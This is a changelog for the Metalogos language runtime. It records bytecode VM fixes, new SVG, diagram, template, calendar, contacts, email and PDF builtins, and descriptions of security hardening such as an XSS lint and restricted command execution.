- Documentation: added docs/refactoring-split-plan.md with per-function module mapping.
- No logic changes in any split — pure code moves.

### VM backend (Naryad #36)
- VM: crosscheck 58/58 — all golden examples match between tree-walking interpreter
  and bytecode VM. Zero mismatches, zero VM errors. `assert!(mismatches.is_empty())`
  now enabled in crosscheck test.
- VM: `find()` entity store query handler added — searches globals for structs
  matching type, field, and comparison operator.
- VM: `resolve_skill_index()` handler added — skill_index declarations now compiled
  into Program (CompiledSkillIndex/CompiledSkillTier/CompiledSkillTriggerRule).
- VM: database support — `db_conn`, `db_insert`, `query_scalar`, `query`, `db_execute`
  handlers added. DB URL extracted from `db` declaration at compile time.
- VM: schema DDL generation — `schema` declarations now generate
  `CREATE TABLE IF NOT EXISTS` SQL, executed at VM startup.
- VM: `context: recall(text, limit=N)` and `context: auto` now work in VM.
  Added `CompiledContextMode` enum (None/Auto/Recall/Literal) and `recall_top()`
  for multi-entry memory retrieval with `format_context_block` formatting.
- Compiler: `call_builtin` and `execute_code` changed to `&mut self` for DB support.
  Name cloning resolves borrow conflicts in CallBuiltin dispatch.
- ADR-0075 updated: all 9 remaining cases resolved. Crosscheck assertion enabled.

### VM backend (Naryad #35)
- VM: `eval_cmp()` now handles String-String comparisons (was Float-only via
  `as_float()`). `"" == ""` now correctly returns true. Fixes while/each loops
  that checked `result == ""` — crosscheck 45/58 → 48/58 (3 cases).
- VM: `MakeStruct` and `Contains` added to `execute_code()` (were only in `run()`).
  Pattern calls from flow pipelines now correctly handle struct literals.
  Fixes dag_demo.mlog — crosscheck 48/58 → 49/58 (1 case).
- VM: `CmpNe` added to `eval_cmp()` numeric path (was `_ => false`).
- ADR-0075 updated: 4 cases resolved in №35, 9 remaining documented with root causes.
  Crosscheck threshold raised to 49/58.
- Remaining VM divergences: memory subsystem (3), rule/find (1), flow source
  expression BinOp limitation (1), skill_index (1), DB builtins (2), modules (1).

### VM backend (Naryad #34)
- Compiler: While, Each, EachWithIndex, Assign, IfThen, IfElseBlock, Break,
  Continue, ExprStmt now compiled to bytecode (were silently dropped).
- Compiler: function-level scoping for LetBinding — `let` inside blocks overwrites
  outer variable, matching interpreter semantics (per p30_scope_let).
- Compiler: Expr::List now emits MakeList(count) (was broken — pushed Float(len)).
- VM: implemented MakeList, ListLen, Pop, StartsWith in both run() and
  execute_code() (were unimplemented!/silently skipped).
- VM: is_truthy() now handles Value::Bool correctly (Bool(true) was always false).
- Crosscheck TW vs VM baseline raised from 37/58 to 45/58 (8 cases closed).
  ADR-0075 documents all 21 remaining divergences.

### Documentation
- README: "Three Execution Backends" → "Two Execution Backends". JIT declared
  experimental (scaffold only, see ADR-0073). Cranelift removed from Prior Art.
- ADR-0075: full list of 21 TW vs VM divergences with categories and root causes.
- ADR-0086: performance baseline benchmarks (parser 178µs, interpreter 272µs,
  compiler 218µs, VM 36µs — VM 7.5× faster).

### Reliability
- Parser returns Result<_, ParseError> instead of aborting the process.
  27 std::process::abort() calls removed; a parse error now produces
  line:col diagnostics and exit code 1 (ADR-0070)
- Golden test runner collects ALL failures before panicking — broken
  examples no longer mask subsequent tests (Block 2)
- p31_* error contracts covered by automated tests (Block 2)
- dag_demo.mlog fixed: Demo() → Demo(input: String) (arity mismatch)

### Diagnostics
- Triage of 92 integration test failures: 8 categories (Block 3, ADR-0071).
  219/311 integration tests pass. Key groups: missing builtins (Phase 23),
  BUILTIN_REGISTRY gaps (8 Telegram/Voice entries), VM unimplemented (5 instructions),
  server-dependent (11 tests), immutable variable (4 tests).

### Added — SVG primitives (naryad #77, ADR-0102)
- `svg_rect`, `svg_circle`, `svg_line`, `svg_text`, `svg_path`,
  `svg_group`, `svg_canvas`, `svg_icon` (10 built-in glyphs),
  `svg_callout`, `svg_sketchy_filter`
- `chart_bar`, `diagram_style` (5-token `DiagramStyle`: paper/ink/
  accent/muted/rule)
- `svg_security_lint` static analysis pass in `semantic.rs` —
  `SVG_AUTO_ESCAPE_BUILTINS` / `SVG_NO_ESCAPE_BUILTINS`, catches XSS
  attempts (including string-concatenation evasion) at `mlog check`
  time

### Added — Palette + first composition (naryad #77)
- `color_palette(intent, mode)` — HSL-cascade generator, 5 intents ×
  2 modes, outputs `DiagramStyle`-compatible tokens
- `chart_donut`
- `std/infographic.mlog` — `InfographicPoster` pattern (MVP)

### Added — Chart types (naryads #78–79)
- `chart_line`, `chart_scatter` (independent two-axis scaling),
  `chart_area`
- `chart_heatmap` (HSL interpolation, no user text — intentionally
  excluded from the lint), `chart_radar` (multi-series, polar
  coordinates), `chart_boxplot` (real quartile computation, linear
  interpolation / R-7 method)

### Added — Procedural backgrounds + canvas presets (naryad #80)
- `svg_generate("flow"/"grid"/"noise", intent, w, h)` — deterministic,
  hash-based noise (no external noise crate)
- `svg_canvas_preset` — named viewBox presets (`doc_inline`,
  `slide_16x9`, `social_og`, `print_a4_landscape`, `print_a4_portrait`)

### Added — Diagram types, 22 total (naryads #81–84)
- Hierarchies/flow: `diagram_tree`, `diagram_org_chart`,
  `diagram_flowchart` (topological layering, cycle detection with a
  clear error), `diagram_layers`
- Temporal/process: `diagram_sequence`, `diagram_timeline`,
  `diagram_gantt`, `diagram_process`, `diagram_loop` (closed cycle via
  `polar_to_xy`)
- Sets/comparison: `diagram_venn` (2 or 3 circles, fixed symmetric
  geometry — general N-circle Venn intentionally out of scope),
  `diagram_quadrant`, `diagram_pyramid`, `diagram_nested`,
  `diagram_medallion` (reuses `svg_icon` validation)
- Data/state: `diagram_er`, `diagram_state` (cycles and self-loops are
  valid, unlike flowchart), `diagram_swimlane`, `diagram_data_flow`,
  `diagram_high_level`, `diagram_architecture` — all three graph-based
  types share a generalized `topological_layers`
- Shared primitive: `draw_connector` (arrow with computed head angle)

### Added — Retroactive crosscheck coverage (naryad #85)
- 36 `.expected` files generated for every example from naryads #77–84
  — none had been covered by `crosscheck_backends` before this naryad
- Found and fixed one real contract bug during the backfill
  (`p83_diagram_venn_2.mlog` used C-style `&&` instead of `and` —
  TW/VM had been "passing" only because both backends produced the
  same parse error)

### Added — Template engine (naryad #86)
- `template_render(template, data) -> Html` — new dedicated engine,
  built from scratch (the existing `render()` does not parse `{{ }}`
  at all and was left untouched)
- `{{ var }}` (auto-escaped), `{{{ var }}}` (raw, added ahead of
  schedule for naryad #90's SVG-in-HTML composition needs),
  `{{#if}}/{{else}}`, `{{#each}}` with `{{ this }}` context, verified
  nesting (`{{#each}}` inside `{{#if}}`)
- Template content itself is intentionally NOT auto-escaped — treated
  as trusted `.mlog`-author code, not end-user input

### Added — Anti-overlap engine (naryad #87)
- `estimate_text_width`, `resolve_overlaps` — iterative pairwise
  bounding-box displacement (not force-directed simulation)
- Wired into `diagram_timeline`, replacing the parity-alternation
  stopgap (kept as the initial seed position, refined by the real
  algorithm)

### Added — `html_render` + `exec()` hardening (naryad #88)
- `exec()`: configurable timeout (default 30s, ceiling 300s, real
  process kill on expiry), file-based audit log
  (`METALOGOS_AUDIT_LOG_PATH`) — added without moving `exec`/
  `html_render` into interpreter-special-cased dispatch
- `exec_restricted` — `Command::new(binary).args(args)`, no shell
  interpretation, closes a class of injection by construction
- `html_render(html, width, height)` — headless-browser screenshot via
  `METALOGOS_BROWSER_BIN` (no hardcoded path; clear error if unset or
  missing). Network isolation is NOT enforced at the OS level —
  documented, not hidden: caller is responsible for self-contained
  HTML (inline styles, `data:` URIs)

### Added — `infographic_qa` (naryad #89)
- WCAG-style contrast ratio check, saturation-discipline check
  (counts high-saturation colors in generated SVG), density check
  (element count / canvas area) — advisory only, `passed: false` is a
  suggestion, not a gate

### Added — Full `std/infographic.mlog` suite (naryad #90)
- `InfographicDashboard` (KPI cards + 2×2 chart grid),
  `InfographicComparison` (side-by-side, shared `chart_type`
  required), `InfographicTimeline` (thin wrapper over
  `diagram_timeline`, anti-overlap applies automatically)
- All three reuse `InfographicPoster`'s header/footer visual grammar

### Fixed — Critical: VM discarded `try`'s result on the success path
- `src/compiler.rs` compiled `Expr::Try(_)` as `Const(Unit)`
  unconditionally since naryad #14 — the wrapped expression was never
  evaluated by the VM at all
- New `Instruction::TryEval(Vec<Instruction>)` — compiles the inner
  expression into its own block, executes it, pushes the real value on
  success or `Unit` on error (matching tree-walking semantics exactly)
- Found by accident during naryad #90; masked for the entire project
  history because all 30 pre-existing `try`-using golden examples only
  tested the error path, where `Unit` happened to be correct either
  way — first golden contract testing the success path is
  `p91_try_success_path.mlog`

### Added — Security audit sweep (naryad #92)
- Classified all 44 SVG/graphics builtins: 0 real gaps found (23
  initial suspects from a naive array-membership grep were false
  positives — either legitimately excluded, e.g. `template_render`,
  `infographic_qa`, `chart_heatmap`, or covered via `SVG_NO_ESCAPE_BUILTINS`
  and dedicated per-function scanners not visible to a literal-array search)
- Added 26 injection tests for the `diagram_*` family — 0 existed
  before this naryad, despite naryad #84's report claiming coverage was
  confirmed (the scanners were real and wired correctly; the tests
  proving they fire were simply never written)

### Changed
- Cargo.toml version 0.17.0 → 0.18.0
- `registry_arity_check.rs` promoted from `test-integration` (advisory)
  to its own `registry-arity-check` (blocking) CI job — the same
  regression class that let a stale `http_get`/`http_post` arity
  assertion sit unnoticed for days (see naryad #73)

## [0.16.0] - 2026-08-13

### Added
- card_connect — connect to a CardDAV server (PROPFIND, addressbook-home-set discovery)
- card_list — list address books (PROPFIND Depth:1)
- card_contacts — contacts from an address book with filtering (CardDAV REPORT addressbook-query, RFC 6352 §8.6)
- card_read — read a single contact by URL
- card_create — create a contact (PUT .vcf, returns UID, arity 3..7)
- card_update — update contact fields (GET+PUT with ETag/If-Match)
- card_delete — delete a contact (DELETE with If-Match)
- card_search — search across all address books (FN + EMAIL)
- vcard_parse — parse vCard text into JSON (RFC 6350, hand-rolled parser)
- vcard_generate — generate vCard text from JSON (v4.0)
- 14 inline tests in contacts.rs (UUID, vCard parse/generate/roundtrip, folding, escaping)
- Integration tests tests/phase_mlg6_contacts.rs (10 tests)
- CardDAV config via env vars: CARDDAV_URL/USER/PASS

### Changed
- Cargo.toml version 0.15.0 → 0.16.0
- BUILTIN_REGISTRY: +10 contacts functions (category "contacts")
- Builtins::new(): +10 dispatcher entries for card_*/vcard_*

## [0.15.0] - 2026-08-13

### Added
- cal_connect — connect to a CalDAV server (PROPFIND, calendar-home-set discovery)
- cal_list — list calendars (PROPFIND Depth:1)
- cal_events — events in a date range (CalDAV REPORT calendar-query, RFC 4791 §7.8)
- cal_read — read a single event by URL
- cal_create — create an event (PUT .ics, returns UID)
- cal_update — update event fields (GET+PUT with ETag/If-Match)
- cal_delete — delete an event (DELETE with If-Match)
- cal_freebusy — free/busy query (CalDAV REPORT free-busy-query, RFC 4791 §7.10)
- ical_parse — parse iCalendar text into JSON (ical crate, RFC 5545)
- ical_generate — generate iCalendar text from JSON (VEVENT + VCALENDAR)
- ical (v0.8), chrono-tz (v0.10) dependencies
- 10 inline tests in calendar.rs (datetime formatting, iCal escaping, parse, generate, roundtrip)
- Integration tests tests/phase_mlg5_calendar.rs (10 tests)
- CalDAV config via env vars: CALDAV_URL/USER/PASS

### Changed
- Cargo.toml version 0.14.0 → 0.15.0
- BUILTIN_REGISTRY: +10 calendar functions (category "calendar")
- Builtins::new(): +10 dispatcher entries for cal_*/ical_*

## [0.14.0] - 2026-08-13

### Added
- smtp_send — send plain-text email via SMTP (lettre crate, TLS/STARTTLS)
- smtp_send_html — send HTML email via SMTP
- imap_list — list inbox messages (IMAP, envelope + flags)
- imap_read — read a full message (headers, body, attachments)
- imap_search — search messages by text (TEXT criteria)
- imap_mark_read — mark a message as read
- imap_move — move a message to another folder (RFC 6851 MOVE / fallback COPY+DELETE)
- lettre (v0.11), imap (v3.0.0-alpha.15), imap-proto (v0.16), native-tls (v0.2) dependencies
- 6 inline tests in email.rs (env guard, content type, header parsing, flag detection)
- Integration tests tests/phase_mlg4_email.rs (10 tests)
- Email config via env vars: SMTP_HOST/PORT/USER/PASS/FROM, IMAP_HOST/PORT/USER/PASS

### Changed
- Cargo.toml version 0.13.0 → 0.14.0
- BUILTIN_REGISTRY: +7 email functions (category "email")
- Builtins::new(): +7 dispatcher entries for smtp_*/imap_*

## [0.13.0] - 2026-08-12

### Added
- pdf_draw_table — tables in PDF (Naryad MLG-3)
- pdf_add_image — insert PNG/JPEG images
- pdf_set_page_header / pdf_set_page_footer — page headers/footers
- pdf_page_numbers — automatic page numbering
- pdf_watermark — watermarks (diagonal text with transparency)
- pdf_fill_form — fill AcroForm fields
- pdf_rotate_page — rotate pages (90/180/270°)
- pdf_delete_pages — delete pages
- pdf_extract_images — extract images from a PDF
- html_to_pdf improved: basic pure-Rust rendering with fallback to wkhtmltopdf
- png crate dependency (v0.17) for PNG image decoding
- 18 inline tests in pdf.rs for the new features
- Integration tests tests/phase_mlg3_pdf_office.rs (13 tests)
- Example examples/p_pdf_office.mlog

### Changed
- PdfDocument struct: added fields header, footer, watermark, page_number_format, page_number_pos
- PdfElement enum: added Table, Image, Watermark variants
- html_to_pdf: the Rust renderer (simple HTML) takes priority over wkhtmltopdf (complex HTML)
- render_pdf: supports Table/Image/Watermark elements, renders header/footer/page_numbers/watermark on every page

## [0.12.0] - 2026-07-30

**Production hardening (naryads #29 and #30).**

### Security
- .env purged from git history and from all branches
- Session HMAC key read from METALOGOS_HMAC_KEY (previously regenerated
  on every start — sessions broke on restart)
- CSRF tokens: 15-minute TTL and background cleanup (previously grew without bound)
- SECRET_LEAK: secret detection in the http_post body by argument position
  (ADR-0064) — headers remain the normal authorization channel
- unsafe blocks: 5 -> 1 (only the Cranelift JIT remains, documented)

### Reliability
- Sessions, CSRF, and rate limits moved to DashMap
- Concurrent request handling: interpreter calls wrapped in
  tokio::task::block_in_place, scheduler lock hold time reduced (ADR-0067)
- Memory graph moved to StableDiGraph: deleting a node no longer corrupts
  the indices of the others (ADR-0066)
- Typed errors: RuntimeError via thiserror, lock_or_err helper

### Language
- +slice(list, start, end) — list slicing, semantics mirrors substring (ADR-0069)
- db_execute accepts an optional parameter list — parity with query()
  (ADR-0068). SQL string concatenation is no longer the only way
- Semantics pinned by golden contracts: let inside a nested block
  assigns to the outer variable; assignment requires let mut;
  kv_get on a missing key returns an empty string

### Tests and CI
- Unit tests: 233 -> 373
- GitHub Actions: blocking test-lib and fmt, advisory test-integration and clippy
- Fixed an env-variable race in the parallel llm.rs tests
- Cargo.lock brought under version control, builds reproducible

### Build
- Dockerfile: rust 1.85, runs as an unprivileged user

### Known limitations
- 92 of 310 integration tests red (accumulated debt, triage — naryad #31)
- 191 clippy warnings (advisory job)
- Fluid Types and confidence propagation not covered by tests
- BUILTIN_REGISTRY and Builtins::new() out of sync: 67 callable
  functions missing from the registry, 44 registry entries have no handler

## [0.11.0] — 2026-07-23

**Lifecycle hooks + YAML config (Naryad O-2).**

Lifecycle hooks extended from 2 to 5 points and YAML support in config_load. Concepts inspired by [obsidian-mind](https://github.com/breferrari/obsidian-mind) (TypeScript, 3.5k★, MIT — code NOT copied, only architectural concepts).

### Lifecycle hooks (2 → 5)

- `hook on_session_start { ... }` — fires once at the start of `run()`, after all declarations are registered.
- `hook on_write { ... }` — fires before each mutating builtin (mem_set, mtree_store, db_execute, write_file, append_file). Variables: `target` (String), `args` (List).
- `hook on_session_end { ... }` — fires once at the end of `run()`.
- Existing `before_pattern` / `after_pattern` unchanged (ADR-0045).

### config_load — YAML support

- `config_load(path)` now auto-detects the format by extension: `.yaml`/`.yml` → YAML, otherwise → JSON.

### New dependencies

- `serde_yaml = "0.9"` — YAML config parsing.

### Changed files

- `src/grammar.pest` — 3 new tokens (on_session_start, on_write, on_session_end), hook_kind extended, step_ident negative lookahead
- `src/ast.rs` — HookPhase: 2 → 5 variants (OnSessionStart, OnWrite, OnSessionEnd)
- `src/parser.rs` — parse_hook_decl: handling of the 5 points
- `src/interpreter.rs` — 3 new fields, two-phase run(), fire_on_write_hooks() at 3 call sites
- `src/builtins.rs` — config_load: YAML support + yaml_to_json_value() helper
- `Cargo.toml` — version 0.11.0, serde_yaml
- `docs/adr/0064-obsidian-mind-lifecycle-hooks.md` — ADR
- `docs/adr/0065-config-load-yaml.md` — ADR
- `examples/hooks_lifecycle.mlog` — demo of all 5 lifecycle hooks

## [0.10.0] — 2026-07-23

**Vault/memory builtins inspired by [obsidian-mind](https://github.com/breferrari/obsidian-mind) (MIT — code NOT copied, only architectural concepts).**

### New builtins (3)

**Semantic search:**

- `semantic_search(query, documents, top_k)` — semantic search over a list of documents. Returns a list of `SearchResult{index, text, score}`. Uses EmbeddingManager: OpenAI text-embedding-3-small if `METALOGOS_EMBEDDING_API_KEY` is set, otherwise TF-IDF fallback. Inspired by the QMD semantic search from obsidian-mind.

**Configuration and validation:**

- `config_load(path)` — loads a JSON configuration file into a struct. The type name is taken from the file name (stem). Inspired by vault-manifest.json — the coordination point pattern from obsidian-mind.
- `vault_validate(config, required_fields)` — checks that a struct contains all the specified required fields. Returns `ValidationResult{valid, missing}`. Inspired by frontmatter_required from obsidian-mind.

### Changed files

- `src/builtins.rs` — 3 new builtins (semantic_search, config_load, vault_validate), EmbeddingManager import, BUILTIN_REGISTRY entries

## [0.9.6] — 2026-07-23

**Narad ML-1: host key in mlogserver + json_get NULL fix.**

### Bug fixes

- **mlogserver `host:` key** (bug №2): the `mlogserver` block now accepts an optional `host: "127.0.0.1"` key for binding to the specified address instead of the hardcoded `0.0.0.0`. Closes the port race on Render. Backward compatibility: missing `host:` → default `"0.0.0.0"`.
- **`json_get` SQL NULL** (bug №1): `json_get(row, key, default)` now returns `default` when the field value is SQL NULL (`Value::Unit`). Previously it returned `Unit`, which caused a `type mismatch` when concatenating `String + Unit`. The two-argument form (without default) is unchanged.

### Changed files

- `src/grammar.pest` — the `mlogserver_host` rule, `"host"` in the `step_ident` exceptions
- `src/ast.rs` — a `host: Option<String>` field in `MlogServerDecl`
- `src/parser.rs` — parsing of `host` in `parse_mlogserver_decl`
- `src/server.rs` — binding to `config.host` with the `"0.0.0.0"` fallback
- `src/builtins.rs` — a `Value::Unit` check in the 3-argument branch of `json_get`

## [0.9.5] — 2026-07-21

**OpenPlanter-inspired: Agent utility builtins (ADR-0063).**

Concepts borrowed from https://github.com/ShinMegamiBoson/OpenPlanter (MIT — code NOT copied, only ideas).

### New dependencies

- `strsim = "0.11"` — Jaro-Winkler fuzzy string comparison
- `crc32fast = "1.4"` — fast CRC32 hashing

### New builtins (8)

**Fuzzy comparison (fuzzy matching):**

- `fuzzy_match(a, b)` — Jaro-Winkler similarity of two strings (0.0..1.0). Based on OpenPlanter `wiki/matching.rs::NameRegistry`.
- `fuzzy_find_best(query, candidates)` — the best match from a list of candidates → `FuzzyMatch{index, candidate, score}`.

**Content-verified editing (hashlines):**

- `hashline_read(text)` — annotate lines with a 2-character CRC32 hash: `N:HH|content`. Prevents LLM editing of stale content.
- `hashline_edit(text, edits)` — editing with hash verification. 3 operations: `set_line`, `replace_lines`, `insert_after`. Error on hash mismatch.

**Agent utilities:**

- `compact_list(items, keep_first, keep_last)` — context compaction: head/tail items protected, the middle collapses into `Compacted{compacted: true, removed_count: N}`. Analog of OpenPlanter `compact_messages()`.
- `budget_check(step, total_steps)` — budget awareness → `BudgetStatus{step, total, remaining, pct_remaining, level}`. Levels: "ok" (≥50%), "warning" (≥25%), "critical" (<25%).
- `replay_snapshot(data)` — delta logging: seq 0 = full snapshot → `ReplaySnapshot{seq, count, snapshot}`. Analog of OpenPlanter `ReplayLogger`.
- `policy_check(command)` — shell command safety check → `PolicyResult{allowed, reason}`. Blocks heredocs (`<<`) and interactive programs (vim, nano, less, etc.).

### Changed files

- `src/builtins.rs` — 8 new builtins + 2 helpers + 20 tests (~590 lines).
- `Cargo.toml` — version 0.9.5, dependencies `strsim`, `crc32fast`.
- `docs/adr/0063-openplanter-agent-utilities.md` — ADR.
- `examples/openplanter_demo.mlog` — demonstration of all 8 builtins.

## [0.9.4] — 2026-07-16

**AgentSkillOS-inspired: Recipe system + DAG orchestration builtins (ADR-0062).**

Concepts borrowed from https://github.com/ynulihao/AgentSkillOS (MIT — code NOT copied, only ideas).

### New builtins (5)

- `recipe_save(name, description, skills, plan)` — build a recipe (a struct with key + recipe) for saving via `kv_set`. Returns `{key: "__recipe:<name>", recipe: {...}}`.
- `recipe_search(query)` — placeholder for semantic recipe search. Returns an empty list (requires embedding infrastructure).
- `recipe_list()` — placeholder for the recipe list. Returns an empty list (requires KV access from the builtin context).
- `dag_phases(dag)` — extract parallel execution phases from a DAG. Input: a list of `{id, depends_on}`. Output: a list of phases (lists of IDs). Kahn's algorithm + cycle detection.
- `topo_sort(dag)` — topological sort of a DAG. Same input format. Output: a flat list of IDs in dependency order.

### Changed files

- `src/builtins.rs` — 5 new builtins + 13 tests (~300 lines).
- `docs/adr/0062-agentskillos-recipe-dag.md` — ADR with the architecture description.
- `examples/dag_demo.mlog` + `.expected` — golden test for dag_phases/topo_sort.

### Limitations

- `recipe_search`/`recipe_list` — placeholders; a full implementation requires access to the KV store from the builtin context.
- No semantic recipe search (requires embeddings).

## [0.9.3] — 2026-07-12

**sqz-inspired builtins and declaration (P1+P2+P3).**

Concepts borrowed from https://github.com/ojuschugh1/sqz (ELv2 — code NOT copied, only ideas).

### P1 — String/list utilities (10 builtins)

- `squeeze(s, chars)` — collapse identical adjacent characters (analog of Ruby String#squeeze).
- `dedup(list)` — remove duplicates, preserving first-occurrence order. Comparison via JSON for complex types.
- `condense(list)` — collapse identical adjacent strings with a repeat count (format: element, "×N").
- `strip(s, chars)` — remove characters from both ends of a string (analog of Python str.strip).
- `chomp(s)` — remove one trailing newline (\n or \r\n, analog of Ruby String#chomp).
- `repeat(s, n)` — repeat a string n times. Validation: n >= 0, integer.
- `pad_left(s, n, fill)` / `pad_right(s, n, fill)` — pad a string with the fill character to length n.
- `lines(s)` — split into a list of lines by \n, without a trailing empty element.
- `words(s)` — split into a list of words by whitespace.

### P2 — TOON encoding + content-addressed refs

- `toon_encode(value)` — encode any value into TOON (Token-Optimized Object Notation). Prefix `TOON:`, keys without quotes, non-ASCII → `\u{XXXX}`. Lossless.
- `toon_decode(s)` — decode TOON back into a Value. Recursive descent parser. Prefix check, JSON-like syntax validation.
- `ref(content)` — SHA-256 hash, stored in the KV store (`__ref:HASH`), returns a hex string (64 characters). Idempotent (INSERT OR IGNORE).
- `deref(hash)` — restore content by hash. Format validation (64 hex characters), error if not found.

### P3 — Token awareness

- `token_count(text)` — token count estimation: Cyrillic chars/2, Latin chars/4, threshold 50%.
- `context_budget` — a new top-level declaration: `context_budget { pattern: "name", limit: 4096 }`. Stores the token budget for learnable patterns in the `Interpreter.context_budgets` HashMap.

### Changed files

- `src/builtins.rs` — 15 new functions + 52 tests.
- `src/grammar.pest` — the `context_budget_decl` rule.
- `src/ast.rs` — `ContextBudgetDecl` struct + `Declaration::ContextBudget` variant.
- `src/parser.rs` — `parse_context_budget_decl`.
- `src/interpreter.rs` — `ContextBudget` handling in `run()` and `clone_definitions_into()`, the `context_budgets` field.
- `src/compiler.rs` — `ContextBudget` in the catch-all arms (pass1 + pass2).

### Tests

- 52 new tests in `mod tests_sqz_builtins`. All pass.
- Totals: 196 passed, 3 failed (pre-existing), 3 ignored.

## [0.9.2] — 2026-07-12

**Patch: fixing 5 E0004 compilation errors (non-exhaustive patterns) after Problem A/B/C/D/E.**

- `compiler.rs`: `BinOp::And`/`Or` — an explicit arm with a compilation error added (short-circuit evaluation is not implemented in VM bytecode, the tree-walking interpreter is required).
- `vm.rs` main loop: `Instruction::MakeList`, `ListLen`, `Pop`, `StartsWith` — `unimplemented!` arms with an explanatory message added (VM bytecode support deferred).
- `vm.rs` `eval_branch_condition`: `ConditionOp::Ne` — the `!=` semantics implemented (by analogy with `Eq`).
- `vm.rs` `eval_rule_condition`: `&ConditionOp::Ne` — the `!=` semantics implemented (by analogy with `Eq`).
- `vm.rs` `eval_binop` Float branch: `BinOp::And`/`Or` — an arm returning a runtime error added (boolean logic is incorrect for Float operands).

## [0.9.1] — 2026-07-12

**The 4-primitives naryad: Problems B + D (Problem B: aggregation, Problem D: webhook diagnosis).**

### Problem B — Aggregation over list of structs (ADR-0059)

- **`map()` in the VM** — `map(list, "pattern_name")` now works in all three backends (tree-walking, bytecode/VM, JIT). Previously — tree-walking only.
- **`map`, `zip`, `sort_by`, `filter`, `reduce` added to BUILTIN_REGISTRY** — previously absent, the compiler could not create `CallBuiltin` for them.
- **`IndexAccess` in execute_code** — patterns in the VM can now use `list[N]` and `struct["key"]` (previously the instruction was handled only in the main loop).
- **`entity` as struct** — STOP Trigger #1 confirmed: `entity TypeName { ... }` fully covers the need for `struct`. No new core code added (ADR-0059).

### Problem D — Webhook routing diagnosis (ADR-0061)

- Diagnosis: `Hook` (ADR-0045) is AOP for patterns, not for HTTP. `route` is a full-fledged HTTP router, sufficient for a Telegram webhook. The root of the bug is architectural (reverse_proxy.py routes `/webhook/*` in Python; the mlog handler is physically unreachable).
- Golden test: `telegram_webhook_route.mlog` — checks `parse_json` + `json_get` on a mock Telegram update JSON.

### Problem C — Schema-as-code (ADR-0060)

- New declaration `schema name { table T { ... } }` — DECLARE tables directly in .mlog files
- Auto-migration at startup: `CREATE TABLE IF NOT EXISTS` (additive-only, never drop/alter)
- Supported types: Int, Float, String, Text, Bool, DateTime
- Modifiers: primary_key, auto_increment, nullable, references(table.field)
- Defaults: default("value"), default(now())
- Integration tests: schema + db_insert + query round-trip, additive migration
- **Limitation**: schema DDL and db_insert work only in tree-walking mode (they require an SQLite connection). The VM/JIT path is deferred.

### Problem A — Tiered Skill Index (ADR-0058)

- New declaration `skill_index name { tier N always [...] | tier N when_matches [...] budget: N tokens truncation: mode }`
- AST: SkillIndexDecl, SkillTier, SkillTriggerRule, TruncationMode
- Grammar: 12 new PEG rules (skill_index_decl, skill_tier, tier_always_list, tier_matches_list, etc.)
- Parser: 2 new parse functions
- Interpreter: `skill_indices` HashMap, `resolve_skill_index` + `fit_to_budget` builtins
- `fit_to_budget` MVP: pass-through (a full implementation with file I/O is deferred)
- 5 integration tests: basic loading, trigger matching, budget/truncation, error handling, 3 tiers
- STOP Trigger #4 documented: the budget is per-model, not a global constant (a known MVP limitation)

---

## [0.9.0] — 2026-07-07

**Unified Builtin Registry — Single Source of Truth refactoring.**

### Architecture

- **`BuiltinSpec` struct + `BUILTIN_REGISTRY` const** — 135 builtins with name, arity, and category in a single master table (`builtins.rs`)
- **Helper functions** — `builtin_names()`, `builtin_indices()`, `builtin_name_set()`, `builtin_arity_map()`, `is_builtin()`, `builtin_count()` — all derived from the registry
- **compiler.rs** — hardcoded 26-entry builtin array replaced with `builtin_indices()` call
- **vm.rs** — hardcoded 26-entry `builtin_names` vec replaced with `builtin_names()` call
- **semantic.rs** — hardcoded 28-entry `builtin_names` set replaced with `builtin_name_set()` call
- **Debug sync check** — `Builtins::check_registry_sync()` asserts (in debug builds) that every non-stateful registry entry has a handler in `Builtins::new()`
- **Duplicate `env` registration removed** (was inserted twice at lines 28 and 70)
- **Before**: adding 1 builtin required editing 5 files; **After**: 1 row in `BUILTIN_REGISTRY` + 1 insert in `Builtins::new()`

### Registry categories

135 builtins organized into categories: string, convert, list, math, std, web, json, crypto, auth, db, llm, memory, io, time, bot, voice, stateful, graph, mtree, cron, test, encoding, stub, fluid, system

---

## [0.7.8] — 2026-06-15

**Naryad №17 closure: BlockIfElse expression in bytecode compiler, format() arity fix.**

### Bytecode compiler

- **`Expr::BlockIfElse` full bytecode compilation** — `if cond { ... } else { ... }` as an expression now compiles to a proper conditional jump chain with a result slot, instead of emitting a `Const(Unit)` placeholder (Naryad 17 B.1)
- New `compile_body_expr` method — compiles statement blocks in expression context, storing the last expression's value into a result local slot
- `format()` arity corrected from `-1` (variadic) to `1` (template-only) in semantic arity checks

### Bug fixes

- Block if/else expression in VM path no longer silently returns `Unit`; the value of the last expression in the matched branch is correctly propagated to the stack

---

## [0.7.7] — 2026-06-14

**Phase 7.7: Break/Continue, Match arms, compiler full-coverage, security constraints.**

### Language

- **`break` and `continue`** statements in `each`, `each_with_index`, and `while` loops (Naryad 17)
- **`MatchArm::StartsWith`** — the `StartsWith` bytecode instruction + VM execution + compiler codegen (Naryad 17)
- **`MatchArm::Compare`** — threshold-based match arms with full compiler support
- **`Statement::IfElseBlock`** — multi-branch `if/else if/else` as statement with full compiler coverage (Naryad 18)
- **`Expr::BlockIfElse`** — block if/else as expression in interpreter (Naryad 14)
- **`Expr::Try`** — try/catch expression, catches errors and returns `Unit` (Naryad 14)

### Bytecode compiler

- Full statement compilation: `LetBinding`, `Assign`, `Return`, `ExprStmt`, `Each`, `EachWithIndex`, `While`, `IfElseBlock`, `IfThen`, `Match`, `Break`, `Continue` (Naryad 18)
- Loop context (`LoopCtx`) for break/continue jump patching — continue jumps back to condition, break jumps to loop end
- `Match` with `Exact`, `StartsWith`, `Contains`, `Compare` arms — all compiled to conditional jump chains
- Global variable slots, `StoreGlobal` instruction (Naryad 22)
- 44 total VM instructions in the bytecode instruction set

### VM

- `StartsWith` instruction — string prefix check, pushes 1.0 (true) or 0.0 (false)
- `StoreGlobal` instruction — write to global variable slot
- `execute_code` method with `&mut self` for mutable global state in pattern execution
- `IndexAccess`, `ListLen`, `MakeList`, `MakeStruct`, `GetField` — collection and struct support

### Semantic analysis

- Opaque type enforcement across all statement types: `Each`, `EachWithIndex`, `While`, `IfElseBlock`, `IfThen`, `Match` (all 4 arm variants)
- Tool declaration body analysis
- Static security audit (`mlog audit`) coverage for new statement forms

### Security constraints (Naryads 19–22)

- `inspect` builtin — introspect variable values without violating opaque types (Naryad 19)
- Context loading from `Entity`/`Memory`/`Fluid` declarations before pattern execution (Naryad 20)
- Event streaming: `emit`/`on` event hooks (Naryad 20)
